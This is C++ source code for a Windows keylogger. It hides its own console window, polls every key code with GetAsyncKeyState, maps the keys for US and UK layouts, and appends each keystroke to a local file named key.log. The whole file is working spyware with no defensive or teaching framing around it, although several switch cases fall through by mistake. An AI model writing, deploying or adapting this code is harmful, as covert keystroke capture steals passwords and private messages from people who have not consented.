#include "windows.h"
#include "iostream"
#include "fstream"
#include "string"
using namespace std;
bool fileinit = 0;
void log(string key){
    fstream logfile;
    logfile.open("key.log", ios::app);
    if(!fileinit){
        logfile << '\n';
        fileinit = 1;
    }
    if(logfile.is_open()){
        logfile << key;
        logfile.close();  
    }
}
char special(int key, bool capstate){
    switch(key){
        case VK_BACK:
            return '\b';
        case VK_ESCAPE:
            log("(ESC)");
            return ' ';
        case VK_SPACE:
            log(" ");
            return ' ';
        case VK_CONTROL:
            log("(CTRL)");
            return ' ';
        case VK_TAB:
            log("(TAB)");
            return ' ';
        case VK_LWIN:
            log("(WIN)");
            return ' ';
        case VK_RWIN:
            log("(WIN)");
            return ' ';
        case VK_MENU:
            log("(ALT)");
            return ' ';    
        case VK_APPS:
            log("(APPS)");
            return ' ';
        case VK_RETURN:
            return '\n';     
        case VK_SHIFT:
            log("(Shift)");
            return ' '; 
        case VK_CAPITAL:
            log("(Caplock)");
            return ' ';
        case VK_F1: 
            log("(F1)");
            return ' ';
        case VK_F2:
            log("(F2)");
            return ' ';
        case VK_F3:
            log("(F3)");
            return ' ';
        case VK_F4:
            log("(F4)");
            return ' ';
        case VK_F5:
            log("(F5)");
            return ' ';
        case VK_F6:
            log("(F6)");
            return ' ';
        case VK_F7:
            log("(F7)");
            return ' ';
        case VK_F8:
            log("(F8)");
        case VK_F9:
            log("(F9)");
            return ' ';
        case VK_F10:
            log("(F10)");
            return ' ';
        case VK_F11:
            log("(F11)");
            return ' ';
        case VK_F12:
            log("(F12)");
            return ' ';
        case VK_OEM_1:
            return ';';
        case VK_OEM_2:
            return '/';
        case VK_OEM_3:
            return '`';
        case VK_OEM_4:
            return '[';
        case VK_OEM_5:
            return '\\';
        case VK_OEM_6:
            return ']';
        case VK_OEM_7:
            return '\'';
        case VK_OEM_PLUS:
            return '=';
        case VK_OEM_COMMA:
            return ',';
        case VK_OEM_MINUS:
            return '-';
        case VK_OEM_PERIOD:
         return '.';
        case VK_LBUTTON:
            log("(Click)");
        case VK_RBUTTON:
            log("(Right Click)");
        case VK_UP:
            log("(Up arrow)");
        case VK_DOWN:
            log("(Down arrow)");
        case VK_LEFT:
            log("(Left arrow)");
        case VK_RIGHT:
            log("(Right arrow)");
        case VK_OEM_102:
            return '~';
        default:
            if(capstate){
                return (char)key;
            }else{
                return (char)tolower(key);
            }
    }
}
char shift(int key, bool uslayout){
    if(uslayout){
        switch(key){
        case (int)'1':
            return '!';
        case (int)'2':
            return '@';
        case (int)'3':
            return '#';
        case (int)'4':
            return '$';
        case (int)'5':
            return '%';
        case (int)'6':
            return '^';
        case (int)'7':
            return '&';
        case (int)'8':
            return '*';
        case (int)'9':
            return '(';
        case (int)'0':
            return ')';
        case VK_OEM_1:
            return ':';
        case VK_OEM_2:
            return '?';
        case VK_OEM_3:
            return '~';
        case VK_OEM_4:
            return '{';
        case VK_OEM_5:
            return '|';
        case VK_OEM_6:
            return '}';
        case VK_OEM_7:
            return '"';
        case VK_OEM_PLUS:
            return '+';
        case VK_OEM_COMMA:
            return '<';
        case VK_OEM_MINUS:
            return '_';
        case VK_OEM_PERIOD:
            return '>';
        
        default:
            return special(key, TRUE);    
    }
    }else{
        switch(key){
        case VK_SHIFT:
            return ' ';
        case (int)'1':
            return '!';
        case (int)'2':
            return '"';
        case (int)'3':
            return '£';
        case (int)'4':
            return '$';
        case (int)'5':
            return '%';
        case (int)'6':
            return '^';
        case (int)'7':
            return '&';
        case (int)'8':
            return '*';
        case (int)'9':
            return '(';
        case (int)'0':
            return ')';
        case VK_OEM_1:
            return ':';
        case VK_OEM_2:
            return '?';
        case VK_OEM_3:
            return '¬';
        case VK_OEM_4:
            return '{';
        case VK_OEM_5:
            return '~';
        case VK_OEM_6:
            return '}';
        case VK_OEM_7:
            return '@';
        case VK_OEM_PLUS:
            return '+';
        case VK_OEM_COMMA:
            return '<';
        case VK_OEM_MINUS:
            return '_';
        case VK_OEM_PERIOD:
            return '>';
        case VK_OEM_102:
            return '~';
        default:
            return special(key, TRUE);    
    }
    }
}   

int main(){
    bool uslayout = 1;
    HKL name = GetKeyboardLayout(GetCurrentThreadId());
    if(name == (HKL)0x8090809){
        uslayout = 0;
    }else{
        uslayout = 1;
    }
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY = 'x';
    bool keystate = 0;
    bool capstate = 0;
    string key;
    while(TRUE){        
        if(GetKeyState(VK_SHIFT) & 0x8000 ){
            keystate = 1;
        }else {
            keystate = 0;
        }
        for(int KEY=8; KEY<=255; KEY++){
            if(GetAsyncKeyState(KEY) == -32767){
                if(KEY == VK_CAPITAL){
                    if(capstate){
                        capstate = 0;
                        
                    }else{
                        capstate = 1;
                       
                    }
                }
                if(keystate){
                        key = shift(KEY, uslayout);
                }else{
                        key = special(KEY, capstate);
                }
                if(key == " "){
                    continue;
                }else{
                    log(key);
                }
                
            }
        }
    }
}
